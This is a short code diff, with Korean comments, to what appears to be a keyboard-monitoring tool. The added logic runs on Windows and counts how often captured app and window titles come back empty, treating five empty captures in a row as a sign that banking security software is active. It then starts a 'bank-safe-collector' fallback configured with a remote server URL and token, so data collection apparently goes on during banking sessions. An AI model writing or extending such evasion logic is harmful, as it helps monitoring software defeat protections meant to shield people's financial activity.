@@ -834,6 +834,52 @@ function resume() {
 function isPaused() { return _paused; }
 
 // ══════════════════════════════════════════════════════════════════════════════
+// 은행 보안 환경 자동 감지 → bank-safe-collector 폴백
+// ══════════════════════════════════════════════════════════════════════════════
+let _emptyCount = 0;
+let _bankSafe = null;
+
+function _checkBankSecurity() {
+  // Windows에서만 동작
+  if (process.platform !== 'win32') return;
+
+  // 최근 분석 결과가 비어있으면 카운트 증가
+  const history = getAnalysisHistory();
+  const last = history[history.length - 1];
+  if (last && (!last.appName || last.appName === '') && (!last.windowTitle || last.windowTitle === '')) {
+    _emptyCount++;
+  } else {
+    _emptyCount = 0;
+    // 정상 복구 시 bank-safe-collector 중지
+    if (_bankSafe) {
+      try { _bankSafe.notifyActive(); } catch {}
+    }
+  }
+
+  // 5회 연속 비어있으면 은행 보안 감지 → bank-safe-collector 시작
+  if (_emptyCount >= 5 && !_bankSafe) {
+    try {
+      _bankSafe = require('./bank-safe-collector');
+      if (!_bankSafe.isRunning()) {
+        console.log('[keyboard-watcher] 은행 보안 감지 → bank-safe-collector 시작');
+        _bankSafe.start({
+          serverUrl: _remoteUrl,
+          token: _remoteToken,
+          interval: 5 * 60 * 1000,
+        });
+      }
+    } catch (e) {
+      console.warn('[keyboard-watcher] bank-safe-collector 로드 실패:', e.message);
+    }
+  }
+}
+
+// 5분마다 은행 보안 체크
+if (process.platform === 'win32') {
+  setInterval(_checkBankSecurity, 5 * 60 * 1000);
+}
+
+// ══════════════════════════════════════════════════════════════════════════════
 // 내보내기
 // ══════════════════════════════════════════════════════════════════════════════
 
